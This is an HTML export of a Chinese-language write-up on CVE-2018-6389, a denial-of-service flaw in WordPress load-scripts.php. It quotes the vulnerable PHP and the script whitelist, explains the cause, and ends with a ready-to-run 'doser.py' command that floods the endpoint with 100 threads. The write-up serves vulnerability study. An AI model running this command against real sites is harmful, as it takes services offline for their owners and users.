<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="Xbaabfe45cc38f4a1cbf25d50cb81ac6a37d995f"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-6389</span><span class="csECDA2D3">）</span><span class="csDE05BCC">WordPress &lt;= 4.9.x </span><span class="csECDA2D3">拒绝服务漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">WordPress &lt;= 4.9.x</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">在文件</span><span class="cs8926E06"> WordPress/wp-admin/load-scripts.php </span><span class="cs9C1B1871">中：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...//ignore</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$load = $_GET[&#39;load&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if ( is_array( $load ) ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$load = implode( &#39;&#39;, $load );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$load = preg_replace( &#39;/[^a-z0-9,_-]+/i&#39;, &#39;&#39;, $load );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$load = array_unique( explode( &#39;,&#39;, $load ) );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...//ignore</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">foreach ( $load as $handle ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ( ! array_key_exists( $handle, $wp_scripts-&gt;registered ) ) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$path = ABSPATH . $wp_scripts-&gt;registered[ $handle ]-&gt;src;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out .= get_file( $path ) . &quot;\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...//ignore</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo $out;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">exit;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">load-scripts.php </span><span class="cs9C1B1871">文件会根据</span><span class="cs8926E06">load</span><span class="cs9C1B1871">参数传入的文件名依次载入文件并输出。同时程序对</span><span class="cs8926E06">load</span><span class="cs9C1B1871">参数的内容进行了过滤，只有在白名单</span><span class="cs8926E06">$wp_scripts</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">JS</span><span class="cs9C1B1871">文件才会被载入。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该</span><span class="cs8926E06">JS</span><span class="cs9C1B1871">文件白名单的内容在文件</span><span class="cs8926E06"> WordPress/wp-includes/script-loader.php </span><span class="cs9C1B1871">中：</span></p><p class="cs3A447A38"><span class="cs9FB05234">...//ignore</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;wp-lists&#39;, &quot;/wp-includes/js/wp-lists$suffix.js&quot;, array( &#39;wp-ajax-response&#39;, &#39;jquery-color&#39; ), false, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// WordPress no longer uses or bundles Prototype or script.aculo.us. These are now pulled from an external source.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;prototype&#39;, &#39;https://ajax.googleapis.com/ajax/libs/prototype/1.7.1.0/prototype.js&#39;, array(), &#39;1.7.1&#39; );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;scriptaculous-root&#39;, &#39;https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/scriptaculous.js&#39;, array( &#39;prototype&#39; ), &#39;1.9.0&#39; );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;scriptaculous-builder&#39;, &#39;https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/builder.js&#39;, array( &#39;scriptaculous-root&#39; ), &#39;1.9.0&#39; );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;scriptaculous-dragdrop&#39;, &#39;https://ajax.googleapis.com/ajax/libs/scriptaculous/1.9.0/dragdrop.js&#39;, array( &#39;scriptaculous-builder&#39;, &#39;scriptaculous-effects&#39; ), &#39;1.9.0&#39; );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;...//ignore</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;jquery-ui-sortable&#39;, &quot;/wp-includes/js/jquery/ui/sortable$dev_suffix.js&quot;, array( &#39;jquery-ui-mouse&#39; ), &#39;1.11.4&#39;, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;jquery-ui-spinner&#39;, &quot;/wp-includes/js/jquery/ui/spinner$dev_suffix.js&quot;, array( &#39;jquery-ui-button&#39; ), &#39;1.11.4&#39;, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;jquery-ui-tabs&#39;, &quot;/wp-includes/js/jquery/ui/tabs$dev_suffix.js&quot;, array( &#39;jquery-ui-core&#39;, &#39;jquery-ui-widget&#39; ), &#39;1.11.4&#39;, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;jquery-ui-tooltip&#39;, &quot;/wp-includes/js/jquery/ui/tooltip$dev_suffix.js&quot;, array( &#39;jquery-ui-core&#39;, &#39;jquery-ui-widget&#39;, &#39;jquery-ui-position&#39; ), &#39;1.11.4&#39;, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$scripts-&gt;add( &#39;jquery-ui-widget&#39;, &quot;/wp-includes/js/jquery/ui/widget$dev_suffix.js&quot;, array( &#39;jquery&#39; ), &#39;1.11.4&#39;, 1 );</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">...//ignore</span></p><p class="cs40DD2BC9"><span class="cs8926E06">JS</span><span class="cs9C1B1871">文件白名单中共有</span><span class="cs8926E06">181</span><span class="cs9C1B1871">个文件。如果我们请求</span><span class="cs8926E06"> load-scripts.php </span><span class="cs9C1B1871">文件使其同时载入全部</span><span class="cs8926E06">JS</span><span class="cs9C1B1871">文件，</span><span class="cs8926E06">PHP</span><span class="cs9C1B1871">代码将要进行</span><span class="cs8926E06">181</span><span class="cs9C1B1871">次的读取操作。若同时发起多个载入全部</span><span class="cs8926E06">JS</span><span class="cs9C1B1871">文件的请求，这将极大地消耗服务器资源，即有可能导致网站无法正常响应其他用户的请求。</span></p><h3 class="cs868C439D">
			<a name="漏洞利用"><span class="csD6CA00D2">漏洞利用</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/CVE-2018-6389"><span class="cs4B51D5E4">https://github.com/ianxtianxt/CVE-2018-6389</span></a></span></p><p class="cs3A447A38"><span class="cs9FB05234">python doser.py -g &#39;http://0-sec.org/wp-admin/load-scripts.php?c=1&amp;load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&amp;ver=4.9&#39; -t 100</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
